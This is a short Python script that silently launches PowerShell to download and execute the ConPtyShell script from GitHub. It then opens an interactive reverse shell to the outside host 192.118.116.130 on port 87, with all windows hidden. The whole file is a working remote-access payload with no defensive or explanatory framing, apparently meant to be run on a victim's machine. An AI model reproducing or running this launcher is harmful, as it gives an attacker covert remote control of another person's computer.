import subprocess

#powershell command to execute
COMMAND = "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.118.116.130 87"  # <-- Thay lệnh của bạn vào đây
 
 
def run_powershell(command: str):
    result = subprocess.run(
        ["powershell", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", command],
        capture_output=True,
        text=True,
        creationflags=subprocess.CREATE_NO_WINDOW  # hide CMD
    )
    return result.returncode
 
 
if __name__ == "__main__":
    run_powershell(COMMAND)
